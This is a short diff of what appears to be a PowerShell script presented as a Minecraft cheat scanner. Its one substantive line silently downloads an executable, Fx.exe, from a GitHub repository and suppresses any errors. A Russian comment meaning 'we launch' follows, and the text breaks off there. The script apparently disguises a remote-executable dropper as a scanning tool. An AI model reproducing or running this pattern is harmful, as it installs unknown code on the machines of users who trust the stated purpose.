@@ -1,4 +1,4 @@
-# MINECRAFT CHEAT SCANNER v2.0 https://github.com/kilordow/chekerr/releases/download/file/wave.exe
+# MINECRAFT CHEAT SCANNER v2.0 
 Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
